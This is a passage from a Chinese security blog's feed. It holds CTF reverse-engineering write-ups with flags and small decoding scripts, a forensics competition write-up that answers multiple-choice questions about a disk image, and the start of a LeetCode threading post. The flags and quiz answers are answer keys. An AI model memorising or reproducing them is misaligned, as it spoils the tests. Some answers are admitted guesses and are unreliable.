class="line">flag&#123;HappyNewYear!&#125;</span><br></pre></td></tr></table></figure><h1 id="0x006-BJDCTF-2nd-guessgame"><a href="#0x006-BJDCTF-2nd-guessgame" class="headerlink" title="0x006.[BJDCTF 2nd]guessgame"></a>0x006.[BJDCTF 2nd]guessgame</h1><p>拖入IDA中就有flag了</p><p><img src="https://i.loli.net/2020/12/01/B8ifYJoSXZ1n7GK.png" alt="image.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;S1mple_ReV3r5e_W1th_0D_0r_IDA&#125;</span><br></pre></td></tr></table></figure><h1 id="0x007-helloworld"><a href="#0x007-helloworld" class="headerlink" title="0x007.helloworld"></a>0x007.helloworld</h1><p>拖入jadx中就有flag了</p><p><img src="https://i.loli.net/2020/12/01/4thVcrYI1ZzTCDm.png" alt="image.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;7631a988259a00816deda84afb29430a&#125;</span><br></pre></td></tr></table></figure><h1 id="0x008-xor-异或"><a href="#0x008-xor-异或" class="headerlink" title="0x008.xor - 异或"></a>0x008.xor - 异或</h1><p>拖入IDA进行分析，发现储存了异或加密后的flag</p><p><img src="https://i.loli.net/2020/12/01/JunMCrOFymwdGP4.png" alt="image.png"></p><p>写个脚本解密即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">b'f\nk\fw&amp;O.@\x11x\rZ;U\x11p\x19F\x1Fv\"M#D\x0Eg\x06h\x0FG2O'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">    print(chr(flag[i] ^ flag[i<span class="number">-1</span>]),end = <span class="string">''</span>)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/12/01/geUBkJ4Stym6ZH7.png" alt="image.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;QianQiuWanDai_YiTongJiangHu&#125;</span><br></pre></td></tr></table></figure><h1 id="0x009-reverse3-base64"><a href="#0x009-reverse3-base64" class="headerlink" title="0x009.reverse3 - base64"></a>0x009.reverse3 - base64</h1><p>拖入IDA进行分析</p><p>这个是加密函数</p><p><img src="https://i.loli.net/2020/12/01/LCGYVdiuzOEWlpw.png" alt="image.png"></p><p>存在base64码表，推测应该是base64</p><p><img src="https://i.loli.net/2020/12/01/xKH4aj7i3cdzETm.png" alt="image.png"></p><p>base64加密后还有一个简单的赋值操作</p><p>故构造解密脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line">ciphertext = <span class="string">'e3nifIH9b_C@n@dH'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(ciphertext)):</span><br><span class="line">    flag += chr(ord(ciphertext[i])-i)</span><br><span class="line">print(b64decode(flag))</span><br></pre></td></tr></table></figure><p>得到flag</p><p><img src="https://i.loli.net/2020/12/01/wDduBRyQn9eCj8q.png" alt="image.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;i_l0ve_you&#125;</span><br></pre></td></tr></table></figure><h1 id="0x00A-不一样的flag"><a href="#0x00A-不一样的flag" class="headerlink" title="0x00A.不一样的flag"></a>0x00A.不一样的flag</h1><p>拖入IDA进行分析</p><p>得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;222441144222&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;0x000-绪论&quot;&gt;&lt;a href=&quot;#0x000-绪论&quot; class=&quot;headerlink&quot; title=&quot;0x000.绪论&quot;&gt;&lt;/a&gt;0x000.绪论&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;buuoj.cn&quot;&gt;BUUCTF&lt;/a&gt;是一个巨型CTF题库，大致可以类比OIer们的洛谷一样的地方，在BUUCTF上有着分类齐全数量庞大的各方向题目，包括各大CTF的原题&lt;/p&gt;
&lt;p&gt;正所谓”不刷BUU非CTFer“（&lt;del&gt;哪里有过这种奇怪的话啦&lt;/del&gt;），作为一名新晋的蒟蒻CTFer&amp;amp;网安专业选手，咱也来做一做BUUCTF上的题，并把题解在博客上存档一份方便后来者学习（&lt;del&gt;快醒醒，哪里会有人看你的博客啦XD&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;Baby Pwner做的都是pwn题，点开即可查看题解&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;👆在第一篇BUU的题解中我曾经这么说过，但是作为研究二进制安全的新手，同时也作为Baby Pwner，深深地感受到了逆向功底的重要性&lt;/p&gt;
&lt;p&gt;为了巩固自己的逆向功底，提高代码审计的功力，今天开始也并行刷一刷Reverse&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://archive.next.arttnba3.cn/categories/CTF/"/>
    
    
    <category term="信息安全" scheme="http://archive.next.arttnba3.cn/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="CTF" scheme="http://archive.next.arttnba3.cn/tags/CTF/"/>
    
    <category term="逆向工程" scheme="http://archive.next.arttnba3.cn/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
    <category term="UPX" scheme="http://archive.next.arttnba3.cn/tags/UPX/"/>
    
  </entry>
  
  <entry>
    <title>【电子取证-0x01】美亚杯第四届全国电子取证竞赛资格赛write up by arttnba3</title>
    <link href="http://archive.next.arttnba3.cn/2020/10/06/%E3%80%90%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-0x01%E3%80%91%E7%BE%8E%E4%BA%9A%E6%9D%AF%E7%AC%AC%E5%9B%9B%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81%E7%AB%9E%E8%B5%9B%E8%B5%84%E6%A0%BC%E8%B5%9Bwrite-up-by-arttnba3/"/>
    <id>http://archive.next.arttnba3.cn/2020/10/06/%E3%80%90%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-0x01%E3%80%91%E7%BE%8E%E4%BA%9A%E6%9D%AF%E7%AC%AC%E5%9B%9B%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81%E7%AB%9E%E8%B5%9B%E8%B5%84%E6%A0%BC%E8%B5%9Bwrite-up-by-arttnba3/</id>
    <published>2020-10-05T16:20:22.000Z</published>
    <updated>2020-11-12T07:27:22.428Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-绪论"><a href="#0x00-绪论" class="headerlink" title="0x00.绪论"></a>0x00.绪论</h1><p><a href="http://meiyacup.com" target="_blank" rel="noopener">“美亚杯”中国电子数据取证大赛</a>是由<strong>中国刑事警察学院主办、厦门美亚柏科承办的中国电子数据取证大赛</strong>，也是国内较为有名的数据取证比赛</p><p>作为网安专业的小萌新去年对此毫不知情（<del>知情了我可能也过不了资格赛</del>），于是今年想要去玩玩（<del>指划水</del>），所以打算趁时间还够把过去的几次比赛的真题给刷一刷XD</p><a id="more"></a><blockquote><p>注：本人感觉取证比赛就是熟练运用各种工具的比赛…（<del>取证软件公司的硬广</del></p></blockquote><h1 id="0x01-工具"><a href="#0x01-工具" class="headerlink" title="0x01.工具"></a>0x01.工具</h1><p><strong>硬件：</strong></p><ul><li>Microsoft Surface Book 2</li><li>Samsung 500G SSD</li></ul><p><strong>软件：</strong></p><ul><li>取证大师<strong>试用版</strong></li><li>AccessData FTK Imager</li><li>DiskGenius</li><li>火眼证据分析软件V4（付费授权）</li><li>火眼仿真取证软件（付费授权）</li></ul><h1 id="0x02-资格赛-案情介绍"><a href="#0x02-资格赛-案情介绍" class="headerlink" title="0x02.资格赛 - 案情介绍"></a>0x02.资格赛 - 案情介绍</h1><blockquote><p>1.林胜（Victor）是一名三十岁的中学教师。一天，他在家中使用计算机期间，收到一封勒索邮件，其中列出他电子邮件用户名和密码，及其他個人资料，並声称他的用户数据已被窃取，计算机已被入侵。黑客向林胜勒索<strong>两个比特币</strong>，否则会使用他的个人用户数据作非法用途。林无力支付，于是报警，并向警方提供了他的个人计算机作检验。</p><p><img src="https://i.loli.net/2020/10/06/PRyuzoVedDlEBbw.png" alt="image.png"></p><p>2.现你被委派对林的计算机进行电子数据取证，还原事件经过。</p></blockquote><p>本次比赛共1 个章节，50 个小题，每题2分，总共100分，比赛时长118 分钟。</p><h1 id="0x03-资格赛-单项选择题"><a href="#0x03-资格赛-单项选择题" class="headerlink" title="0x03.资格赛 - 单项选择题"></a>0x03.资格赛 - 单项选择题</h1><p>我们选择使用<strong>取证大师</strong>这一取证软件进行我们的取证工作</p><p>新建案例→添加镜像→Victor_PC.E01</p><p>等待自动分析完成，我们可以看到镜像的所有信息在我们面前一览无余</p><p><img src="https://i.loli.net/2020/10/06/7oyvcFkA8zfs9R5.png" alt="image.png"></p><h2 id="1-Victor的笔记本电脑己成功取证并制作成法证映像档-Forensic-Image-，下列哪个是其MD5哈希值"><a href="#1-Victor的笔记本电脑己成功取证并制作成法证映像档-Forensic-Image-，下列哪个是其MD5哈希值" class="headerlink" title="1.Victor的笔记本电脑己成功取证并制作成法证映像档 (Forensic Image)，下列哪个是其MD5哈希值?"></a>1.Victor的笔记本电脑己成功取证并制作成法证映像档 (Forensic Image)，下列哪个是其MD5哈希值?</h2><blockquote><p>A. FC20782C21751AB76B2A93F3A17922D0</p><p>B. 882114D62E713DEA34C270CF2F1C69D2</p><p>C. A0BB016160CFB3A0BB0161661670CFB3</p><p>D. 917ED59083C8B35C54D3FCBFE4C4BB0B</p><p>E. FC20782C21751BA76B2A93F3A17922D0</p></blockquote><p>在取证大师下方的【摘要】一栏中我们可以看到其MD5值应为<strong>FC20782C21751BA76B2A93F3A17922D0</strong></p><p><img src="https://i.loli.net/2020/10/06/N1nHTdcCOm4K68V.png" alt="image.png"></p><h2 id="2-根据法证映像档-Forensic-Image-，确定原笔记本内有多少个硬盘分区"><a href="#2-根据法证映像档-Forensic-Image-，确定原笔记本内有多少个硬盘分区" class="headerlink" title="2.根据法证映像档 (Forensic Image)，确定原笔记本内有多少个硬盘分区?"></a>2.根据法证映像档 (Forensic Image)，确定原笔记本内有多少个硬盘分区?</h2><blockquote><p>A. 1</p><p>B. 2</p><p>C. 3</p><p>D. 4</p><p>E. 5</p></blockquote><p>在左边栏中我们可以看到镜像内有三个硬盘分区</p><p><img src="https://i.loli.net/2020/10/06/exhEMocuCbKIVwQ.png" alt="image.png"></p><h2 id="3-你能找到硬盘操作系统分区内的开始逻辑区块地址（LBA）-答案格式-扇区-Sector"><a href="#3-你能找到硬盘操作系统分区内的开始逻辑区块地址（LBA）-答案格式-扇区-Sector" class="headerlink" title="3.你能找到硬盘操作系统分区内的开始逻辑区块地址（LBA）? (答案格式: 扇区, Sector)"></a>3.你能找到硬盘操作系统分区内的开始逻辑区块地址（LBA）? (答案格式: 扇区, Sector)</h2><blockquote><p>A. 0</p><p>B. 2408</p><p>C. 1048576</p><p>D. 62916608</p><p>E. 32213303296</p></blockquote><p>首先我们分析各磁盘中文件结构，不难看出<strong>E盘应当是系统盘</strong></p><p><img src="https://i.loli.net/2020/10/06/X6ZFHqhTQcEj1lx.png" alt="image.png"></p><p>在【摘要】中我们可以看出其开始逻辑区块地址应为<strong>32,213,303,296</strong></p><p><img src="https://i.loli.net/2020/10/06/qTtHYUcEJjDyOLh.png" alt="image.png"></p><h2 id="4-你能找到硬盘操作系统分区的物理大小吗-字节byte"><a href="#4-你能找到硬盘操作系统分区的物理大小吗-字节byte" class="headerlink" title="4.你能找到硬盘操作系统分区的物理大小吗 (字节byte)?"></a>4.你能找到硬盘操作系统分区的物理大小吗 (字节byte)?</h2><blockquote><p>A. 62709760</p><p>B. 62910464</p><p>C. 104857600</p><p>D. 32107397120</p><p>E. 32210157568</p></blockquote><p>首先在摘要中我们可以得知<strong>每个扇区的大小为512 Byte</strong></p><p><img src="https://i.loli.net/2020/10/06/9AeOzGDJi7LcQoa.png" alt="image.png"></p><p>系统盘中一共有<strong>62,910,464</strong>个扇区</p><p><img src="https://i.loli.net/2020/10/06/qTtHYUcEJjDyOLh.png" alt="image.png"></p><p>于是我们可以计算出系统盘的物理大小应为<strong>32,210,157,568 Bytes</strong></p><blockquote><p>可以使用python辅助计算（计算器当然也行XD只不过我第一时间想起来的就是python（👈把这个天天说废话的人拖出去打死</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PS C:\WINDOWS\system32&gt; python</span><br><span class="line">Python <span class="number">3.7</span>.<span class="number">4</span> (tags/v3.<span class="number">7.4</span>:e09359112e, Jul  <span class="number">8</span> <span class="number">2019</span>, <span class="number">19</span>:<span class="number">29</span>:<span class="number">22</span>) [<span class="type">MSC</span> <span class="type">v.1916</span> <span class="number">32</span> <span class="type">bit</span> (<span class="built_in">Int</span><span class="type">el</span>)] on win32</span><br><span class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> or <span class="string">"license"</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; <span class="number">512</span>*<span class="number">62910464</span></span><br><span class="line"><span class="number">32210157568</span></span><br></pre></td></tr></table></figure></blockquote><blockquote><p>当我把摘要往下翻才发现原来摘要里就有…好气啊…</p><p><img src="https://i.loli.net/2020/10/06/XjOChmZJEQnk4Iy.png" alt="image.png"></p></blockquote><h2 id="5-操作系统分区的文件系统是哪种"><a href="#5-操作系统分区的文件系统是哪种" class="headerlink" title="5.操作系统分区的文件系统是哪种?"></a>5.操作系统分区的文件系统是哪种?</h2><blockquote><p>A. FAT32</p><p>B. EXFAT</p><p>C. NTFS</p><p>D. EXT3</p><p>E. HFS+</p></blockquote><p>在【摘要】中我们可以看出其文件系统应该为<strong>NTFS</strong></p><p><img src="https://i.loli.net/2020/10/06/qTtHYUcEJjDyOLh.png" alt="image.png"></p><h2 id="6-操作系统分区，每个簇-Cluster-包含几个扇区-sectors"><a href="#6-操作系统分区，每个簇-Cluster-包含几个扇区-sectors" class="headerlink" title="6.操作系统分区，每个簇(Cluster)包含几个扇区(sectors)?"></a>6.操作系统分区，每个簇(Cluster)包含几个扇区(sectors)?</h2><blockquote><p>A. 2</p><p>B. 4</p><p>C. 6</p><p>D. 8</p><p>E. 16</p></blockquote><p>emmmm这道题我是用比较笨的方法来做的（因为刚开始学电子取证XD</p><p>首先使用<strong>AccessData FTK Imager</strong>将镜像里的三个盘挂载到自己电脑上</p><p><img src="https://i.loli.net/2020/10/06/aHURQw1P38ktSmK.png" alt="image.png"></p><p>然后使用<strong>DiskGenius</strong>查看分区可知<strong>簇大小为4096 Byte</strong></p><p><img src="https://i.loli.net/2020/10/06/foJDFj5dOrMi6sB.png" alt="image.png"></p><p>前面我们已知单个扇区为<strong>512 Byte</strong>，故每个簇包含 4096 / 512 = *<em>8 *</em> 个扇区</p><h2 id="7-在操作系统分区内，-MFT的物理起始扇区位置-Starting-physical-sector-是什么"><a href="#7-在操作系统分区内，-MFT的物理起始扇区位置-Starting-physical-sector-是什么" class="headerlink" title="7.在操作系统分区内，$MFT的物理起始扇区位置(Starting physical sector)是什么?"></a>7.在操作系统分区内，$MFT的物理起始扇区位置(Starting physical sector)是什么?</h2><blockquote><p>A. 62,919,936</p><p>B. 67,086,648</p><p>C. 68,942,784</p><p>D. 69,208,064</p><p>E. 79,865,960</p></blockquote><p>在取证大师中我们可以看出其物理起始扇区位置应为<strong>69,208,064</strong></p><p><img src="https://i.loli.net/2020/10/06/y5zQqL8KdICjAGl.png" alt="image.png"></p><h2 id="8-请找出系统文件“SOFTWARE＂，请问操作系统的安装日期是-（答案格式-－“世界协调时间＂：YYYY-MM-DD-HH-MM-UTC）"><a href="#8-请找出系统文件“SOFTWARE＂，请问操作系统的安装日期是-（答案格式-－“世界协调时间＂：YYYY-MM-DD-HH-MM-UTC）" class="headerlink" title="8.请找出系统文件“SOFTWARE＂，请问操作系统的安装日期是? （答案格式 －“世界协调时间＂：YYYY-MM-DD HH:MM UTC）"></a>8.请找出系统文件“SOFTWARE＂，请问操作系统的安装日期是? （答案格式 －“世界协调时间＂：YYYY-MM-DD HH:MM UTC）</h2><blockquote><p>A. 2018-10-25 08:08 UTC</p><p>B. 2018-10-25 08:09 UTC</p><p>C. 2018-10-25 08:10 UTC</p><p>D. 2018-10-25 08:11 UTC</p><p>E. 2018-10-25 08:12 UTC</p></blockquote><p>使用取证大师我们可以很方便地找到我们所需的文件并将之提取出来</p><p><img src="https://i.loli.net/2020/10/06/l2Ck9otVxUnKBwb.png" alt="RONVO_P~1_8JDDEBG~UJEA1.png"></p><p><img src="https://i.loli.net/2020/10/06/Cm5WqZti43RBHg6.png" alt="3S0G_N35TRPDI_9ACZBKT_W.png"></p><p>同样的我们使用取证大师也可以看到其系统安装时间为<strong>2018-10-25 16:08:39</strong></p><blockquote><p>（<strong>注：我们所处的时区为UTC+8，所以答案应该再减去8h</strong>）</p></blockquote><p><img src="https://i.loli.net/2020/10/06/6KlSf7RnQruiMXL.png" alt="image.png"></p><h2 id="9-用户“victor＂的唯一标识符-SID-是什么-（答案格式：RID）"><a href="#9-用户“victor＂的唯一标识符-SID-是什么-（答案格式：RID）" class="headerlink" title="9.用户“victor＂的唯一标识符(SID)是什么?（答案格式：RID）"></a>9.用户“victor＂的唯一标识符(SID)是什么?（答案格式：RID）</h2><blockquote><p>A. 1001</p><p>B. 1002</p><p>C. 1003</p><p>D. 1004</p><p>E. 1005</p></blockquote><p>使用取证大师我们可以在【用户信息】一栏很方便地看到每个用户的信息，包括SID，其中<strong>用户victor的SID为1001</strong></p><p><img src="https://i.loli.net/2020/10/06/4IFwv7mJGpHeU6o.png" alt="image.png"></p><h2 id="10-用户“Lily＂的唯一标识符-SID-是什么-（答案格式：RID）"><a href="#10-用户“Lily＂的唯一标识符-SID-是什么-（答案格式：RID）" class="headerlink" title="10.用户“Lily＂的唯一标识符(SID)是什么?（答案格式：RID）"></a>10.用户“Lily＂的唯一标识符(SID)是什么?（答案格式：RID）</h2><blockquote><p>A. 1001</p><p>B. 1002</p><p>C. 1003</p><p>D. 1004</p><p>E. 1005</p></blockquote><p>使用取证大师我们可以很方便地看到每个用户的SID，其中<strong>用户Lily的SID为1003</strong></p><p><img src="https://i.loli.net/2020/10/06/4IFwv7mJGpHeU6o.png" alt="image.png"></p><h2 id="11-Victor上一次更改系统登入密码是-（答案格式-－“本地时间＂：YYYY-MM-DD-HH-MM-8）"><a href="#11-Victor上一次更改系统登入密码是-（答案格式-－“本地时间＂：YYYY-MM-DD-HH-MM-8）" class="headerlink" title="11.Victor上一次更改系统登入密码是? （答案格式 －“本地时间＂：YYYY-MM-DD HH:MM +8）"></a>11.Victor上一次更改系统登入密码是? （答案格式 －“本地时间＂：YYYY-MM-DD HH:MM +8）</h2><blockquote><p>A. 2018-11-01 16:08 +8</p><p>B. 2018-11:01 14:15 +8</p><p>C. 2018-10-26 17:00 +8</p><p>D. 2018-10-25 08:08 +8</p><p>E. 2018-10-25 16:08 +8</p></blockquote><p>我们可以使用取证大师得到用户victor上次修改密码的时间应为 <strong>2018-10-25 16:08:37 + 8</strong></p><p><img src="https://i.loli.net/2020/10/06/rGKXT2lgp8avNYD.png" alt="image.png"></p><h2 id="12-Lily上一次更改系统登入密码是-（答案格式-－“本地时间＂：YYYY-MM-DD-HH-MM-8）"><a href="#12-Lily上一次更改系统登入密码是-（答案格式-－“本地时间＂：YYYY-MM-DD-HH-MM-8）" class="headerlink" title="12.Lily上一次更改系统登入密码是? （答案格式 －“本地时间＂：YYYY-MM-DD HH:MM +8）"></a>12.Lily上一次更改系统登入密码是? （答案格式 －“本地时间＂：YYYY-MM-DD HH:MM +8）</h2><blockquote><p> A. 2018-11-01 03:02:01 +8</p><p>B. 2018-11:02 11:13:33 +8</p><p>C. 2018-10-26 17:00:45 +8</p><p>D. 2018-10-30 12:30:40 +8</p><p>E. 2018-10-27 12:08:37 +8</p></blockquote><p>同样地我们可以得到用户Lily上次修改密码的时间应为 <strong>2018-10-30 12:30:40 + 8</strong></p><p><img src="https://i.loli.net/2020/10/06/rGKXT2lgp8avNYD.png" alt="image.png"></p><h2 id="13-Victor-总共登录系统多少次"><a href="#13-Victor-总共登录系统多少次" class="headerlink" title="13.Victor 总共登录系统多少次?"></a>13.Victor 总共登录系统多少次?</h2><blockquote><p>A. 3</p><p>B. 16</p><p>C. 33</p><p>D. 36</p><p>E. 45</p></blockquote><p>通过取证大师我们可以看到victor总共登录了<strong>36次</strong></p><p><img src="https://i.loli.net/2020/10/06/jhS3ZF7YiEbUuGk.png" alt="image.png"></p><h2 id="14-以下哪个帐号已经被禁用"><a href="#14-以下哪个帐号已经被禁用" class="headerlink" title="14.以下哪个帐号已经被禁用?"></a>14.以下哪个帐号已经被禁用?</h2><blockquote><p>A. Administrator</p><p>B. victor</p><p>C. Lily</p><p>D. simon</p><p>E. 以上皆不是</p></blockquote><p>在取证大师中我们可以看到<strong>Administrator账户处于禁用状态</strong></p><p><img src="https://i.loli.net/2020/10/06/R9EHNgJZIslXnjY.png" alt="image.png"></p><h2 id="15-以下哪个帐系统权限最低"><a href="#15-以下哪个帐系统权限最低" class="headerlink" title="15.以下哪个帐系统权限最低?"></a>15.以下哪个帐系统权限最低?</h2><blockquote><p>A. Administrator</p><p>B. victor</p><p>C. Lily</p><p>D. simon</p><p>E. 以上权限一样</p></blockquote><p>Simon账户处在Guests用户组，权限最低</p><p><img src="https://i.loli.net/2020/10/06/R9EHNgJZIslXnjY.png" alt="image.png"></p><h2 id="16-以下哪个帐号曾经远端登录系统"><a href="#16-以下哪个帐号曾经远端登录系统" class="headerlink" title="16.以下哪个帐号曾经远端登录系统?"></a>16.以下哪个帐号曾经远端登录系统?</h2><blockquote><p>A. Administrator</p><p>B. victor</p><p>C. Lily</p><p>D. simon</p><p>E. 远端登入已被禁止</p></blockquote><p>emmm看了一圈发现没有账号有远端登入的记录，只能大胆猜测远端登入已被禁止了XDD</p><p>后面或许能够找到这题的正确解法（瘫</p><h2 id="17-硬盘操作系统的版本"><a href="#17-硬盘操作系统的版本" class="headerlink" title="17.硬盘操作系统的版本?"></a>17.硬盘操作系统的版本?</h2><blockquote><p>A. Windows 7 Enterprise (32 位)</p><p>B. Windows 7 Enterprise (64 位)</p><p>C. Windows 7 Professional (32 位)</p><p>D. Windows 7 Professional (64 位)</p><p>E. Windows 7 Ultimate (64 位)</p></blockquote><p>取证大师中我们可以看到系统版本为<strong>64位的Win7 Professional</strong></p><p><img src="https://i.loli.net/2020/10/06/6KlSf7RnQruiMXL.png" alt="image.png"></p><h2 id="18-操作系统的最新服务包-Service-Pack-版本号是什么"><a href="#18-操作系统的最新服务包-Service-Pack-版本号是什么" class="headerlink" title="18.操作系统的最新服务包(Service Pack)版本号是什么?"></a>18.操作系统的最新服务包(Service Pack)版本号是什么?</h2><blockquote><p>A. Service Pack 1</p><p>B. Service Pack 2</p><p>C. Service Pack 3</p><p>D. Service Pack 4</p><p>E. Service Pack 5</p></blockquote><p> 还是在取证大师中我们可以看到最新服务包为<strong>Service Pack 1</strong></p><p><img src="https://i.loli.net/2020/10/06/6KlSf7RnQruiMXL.png" alt="image.png"></p><h2 id="19-下列哪个是victor的默认打印机"><a href="#19-下列哪个是victor的默认打印机" class="headerlink" title="19.下列哪个是victor的默认打印机?"></a>19.下列哪个是victor的默认打印机?</h2><blockquote><p>A. HP OfficeJet 250 Mobile Series</p><p>B. CutePDF Writer</p><p>C. Microsoft XPS Document Writer</p><p>D. PDF Complete</p><p>E. AL-M2330</p></blockquote><p>这道题直接看配置可能没啥思路（<del>比如说像我这样菜的人就一头雾水</del></p><p>比较快捷的做法是<strong>火眼仿真</strong>直接<strong>登录victor账户随便打印一个文档看看</strong></p><p>可以看出来默认打印机应当是<strong>CutePDF Writer</strong></p><p><img src="https://i.loli.net/2020/11/12/5Lcf6mPKMVCg4Qv.png" alt="image.png"></p><h2 id="20-在2018-10-31-08-29-32-8时间-账号simon曾经使用以下哪个文件"><a href="#20-在2018-10-31-08-29-32-8时间-账号simon曾经使用以下哪个文件" class="headerlink" title="20.在2018-10-31 08:29:32 +8时间, 账号simon曾经使用以下哪个文件?"></a>20.在2018-10-31 08:29:32 +8时间, 账号simon曾经使用以下哪个文件?</h2><blockquote><p>A. Microsoft 商店.url</p><p>B. ug.jpeg</p><p>C. Reddy Resume.doc</p><p>D. grocerylistsDOTorg_Spreadsheet_v1_1.xls</p><p>E. InvoiceTemplate.docx</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;0x00-绪论&quot;&gt;&lt;a href=&quot;#0x00-绪论&quot; class=&quot;headerlink&quot; title=&quot;0x00.绪论&quot;&gt;&lt;/a&gt;0x00.绪论&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;http://meiyacup.com&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;“美亚杯”中国电子数据取证大赛&lt;/a&gt;是由&lt;strong&gt;中国刑事警察学院主办、厦门美亚柏科承办的中国电子数据取证大赛&lt;/strong&gt;，也是国内较为有名的数据取证比赛&lt;/p&gt;
&lt;p&gt;作为网安专业的小萌新去年对此毫不知情（&lt;del&gt;知情了我可能也过不了资格赛&lt;/del&gt;），于是今年想要去玩玩（&lt;del&gt;指划水&lt;/del&gt;），所以打算趁时间还够把过去的几次比赛的真题给刷一刷XD&lt;/p&gt;</summary>
    
    
    
    <category term="电子取证" scheme="http://archive.next.arttnba3.cn/categories/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/"/>
    
    
    <category term="电子取证" scheme="http://archive.next.arttnba3.cn/tags/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/"/>
    
    <category term="美亚杯" scheme="http://archive.next.arttnba3.cn/tags/%E7%BE%8E%E4%BA%9A%E6%9D%AF/"/>
    
  </entry>
  
  <entry>
    <title>【OJ-0x0006-Leetcode】多线程部分write up by arttnba3</title>
    <link href="http://archive.next.arttnba3.cn/2020/10/02/%E3%80%90OJ-0x0006-Leetcode%E3%80%91%E5%A4%9A%E7%BA%BF%E7%A8%8B%E9%83%A8%E5%88%86write-up-by-arttnba3/"/>
    <id>http://archive.next.arttnba3.cn/2020/10/02/%E3%80%90OJ-0x0006-Leetcode%E3%80%91%E5%A4%9A%E7%BA%BF%E7%A8%8B%E9%83%A8%E5%88%86write-up-by-arttnba3/</id>
    <published>2020-10-01T17:23:31.000Z</published>
    <updated>2020-10-03T18:38:54.128Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-绪论"><a href="#0x00-绪论" class="headerlink" title="0x00.绪论"></a>0x00.绪论</h1><p>虽然说很久以前已经“学过了“多线程的内容，但是其实还是一知半解XD（其实是一点都不懂多线程（虽然说写过几个简单的多线程的应用小程序（👈那只是Java作业的程度啊喂（👈没有用心学习的屑</p><p>思来想去还是得靠leetcode来巩固基础知识啊（x</p><blockquote><p>虽然说题目挺少……<del>不过也凑合凑合刷刷</del></p><p><del>其实盯上的就是题目少的题库</del></p></blockquote><a id="more"></a><p>（偷偷在这里说一句为了巩固代码力决定各种语言的写法都学一遍（</p><h1 id="0x01-简单"><a href="#0x01-简单" class="headerlink" title="0x01.简单"></a>0x01.简单</h1><h2 id="0x00-按序打印"><a href="#0x00-按序打印" class="headerlink" title="0x00. 按序打印"></a>0x00.<a href="https://leetcode-cn.com/problems/print-in-order/" target="_blank" rel="noopener"> 按序打印</a></h2><blockquote><p>我们提供了一个类：</p><p>public class Foo {<br>  public void first() { print(“first”); }<br>  public void second() { print(“second”); }<br>  public void third() { print(“third”); }<br>}<br>三个不同的线程将会共用一个 Foo 实例。</p><p>线程 A 将会调用 first() 方法<br>线程 B 将会调用 second() 方法<br>线程 C 将会调用 third() 方法<br>请设计修改程序，以确保 second() 方法在 first() 方法之后被执行，third() 方法在 second() 方法之后被执行。</p><p>示例 1:</p><p>输入: [1,2,3]<br>输出: “firstsecondthird”<br>解释:<br>有三个线程会被异步启动。<br>输入 [1,2,3] 表示线程 A 将会调用 first() 方法，线程 B 将会调用 second() 方法，线程 C 将会调用 third() 方法。<br>正确的输出是 “firstsecondthird”。<br>示例 2:</p><p>输入: [1,3,2]<br>输出: “firstsecondthird”<br>解释:<br>输入 [1,3,2] 表示线程 A 将会调用 first() 方法，线程 B 将会调用 third() 方法，线程 C 将会调用 second() 方法。<br>正确的输出是 “firstsecondthird”。</p><p>提示：</p><p>尽管输入中的数字似乎暗示了顺序，但是我们并不保证线程在操作系统中的调度顺序。<br>你看到的输入格式主要是为了确保测试的全面性。</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/print-in-order" target="_blank" rel="noopener">https://leetcode-cn.com/problems/print-in-order</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><p>【简单】难度的唯一一道题，<del>看来题库也才刚刚建设起来呐</del></p><h3 id="解法一：信号量"><a 